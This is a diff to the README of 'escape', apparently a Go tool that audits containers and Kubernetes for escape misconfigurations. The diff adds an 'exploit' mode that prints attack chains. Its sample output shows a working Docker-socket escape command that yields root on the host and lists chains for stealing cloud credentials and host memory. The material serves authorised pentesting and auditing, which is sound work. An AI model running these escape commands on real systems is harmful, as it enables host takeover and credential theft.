@@ -1,11 +1,18 @@
 # 🐒 escape
 
-> **ESC + APE** — read-only audit CLI for containers and Kubernetes.
-> Enumerates the misconfigurations that real-world *container escapes* live on, without ever pulling the trigger.
+> **ESC + APE** — drop-in container/Kubernetes auditor *and* exploit suggester.
+> Enumerates the misconfigurations that real-world *container escapes* live on,
+> then chains them into copy-paste PoCs so pentesters can act on the findings.
 
-`escape` is a single-binary, zero-dependency tool in Go. Drop it inside a container or pod and it tells you, in seconds, whether the workload is one CVE away from owning the host.
+`escape` is a single-binary, zero-dependency tool in Go. Drop it inside a container or pod and in seconds it tells you:
 
-It does **not** exploit anything. Every check is read-only: open files in `/proc`, parse env vars, perform passive TCP probes. No syscalls that mutate state, no API requests with stolen tokens, no `mount`, no `kexec`. Safe to run on any environment you're authorized to audit.
+1. **What is misconfigured** (`escape scan`) — 30 read-only checks across container, Kubernetes, host and cloud.
+2. **How to escape** (`escape exploit`) — correlates the findings into known **attack chains** and prints public-domain PoC commands. Never executes them — that's on you, under your scope.
+
+The audit half is read-only by design: only `Stat`/`ReadFile`/`ReadDir`, env-var reads, and passive TCP probes. The `exploit` subcommand prints commands as text; it never invokes them.
+
+> **For pentesters / CTF players** — see [`docs/PENTEST.md`](docs/PENTEST.md) for the offensive how-to.
+> **For blue teams** — `escape scan --output sarif` slots into GitHub Code Scanning; `--output html` produces a self-contained client-ready report.
 
 ---
 
@@ -75,13 +82,44 @@ escape version
 ### Other commands
 
 ```bash
+escape exploit                              # show chains that match the live env
+escape exploit --steps --authorised         # include copy-paste PoC commands
+escape exploit --from scan.json --output markdown -output-file kill-chain.md
+
 escape explain container.privileged host.proc_kcore
 # Prints metadata + remediation for those checks without running them.
-# Useful when triaging a finding from a saved JSON/SARIF report.
 
 escape list-checks --module host --output json
 # Browse the catalogue.
 ```
+
+### `escape exploit` in 30 seconds
+
+```
+$ escape scan --quiet --output json --output-file scan.json
+$ escape exploit --from scan.json --steps --authorised
+
+  [1/3] chain.docker_sock_pivot  ─  Docker socket → host root
+        Goal:        Spawn a privileged container that mounts / from the host…
+        Severity:    critical   Risk: destructive   Confidence: high
+        ATT&CK:      T1611, T1610
+        Triggered by: container.mounts.docker_sock
+        Steps:
+          1. Confirm socket is reachable and writable
+             ls -l /var/run/docker.sock
+             docker -H unix:///var/run/docker.sock info | head -20
+          2. Pivot to host root via a new container with / bind-mounted
+             docker -H unix:///var/run/docker.sock run --rm -it \
+                 --privileged --pid=host -v /:/host alpine \
+                 chroot /host /bin/bash
+          ↪ You're now root on the host. /host is the host root.
+  …
+```
+
+10 chains today: docker_sock_pivot, cgroup_release_agent (CVE-2022-0492),
+host_disk_mount, sys_ptrace_pivot, sys_module_load, dac_read_search,
+k8s_sa_pivot, imds_aws_creds, kcore_exfil, suid_no_new_privs,
+sensitive_mounts_loot.
 
 ---
 
@@ -267,6 +305,22 @@ func init() {
 The new check appears automatically in `escape list-checks` and `escape scan`.
 
 ---
+
+## How ESCAPE compares to existing tools
+
+| | escape | linpeas | amicontained | CDK | peirates | deepce |
+|---|:-:|:-:|:-:|:-:|:-:|:-:|
+| Single static binary | ✅ Go | ❌ shell | ✅ Go | ✅ Go | ✅ Go | ❌ shell |
+| No runtime deps | ✅ | partial | ✅ | ✅ | ✅ | partial |
+| Container & K8s & cloud focus | ✅ | partial | container only | ✅ | K8s only | container only |
+| ATT&CK / CVE metadata | ✅ | ❌ | ❌ | partial | partial | ❌ |
+| Audit *and* exploit modes | ✅ | exploit | audit only | exploit | exploit | exploit |
+| Auto-execute exploits | ❌ by design | n/a | n/a | ✅ | interactive | ✅ |
+| HTML / SARIF output | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ |
+| Read-only-by-default | ✅ | n/a | ✅ | ❌ | n/a | ❌ |
+| CI-friendly exit codes | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ |
+
+**Niche.** ESCAPE sits between linpeas (great for pentest, no enterprise output) and tools like trivy/kube-bench (great for CI, no offensive value). It's the binary you can drop in either context — a hardened CI gate, a CTF box, an authorised engagement — and get the right output without swapping tools.
 
 ## Lab
 
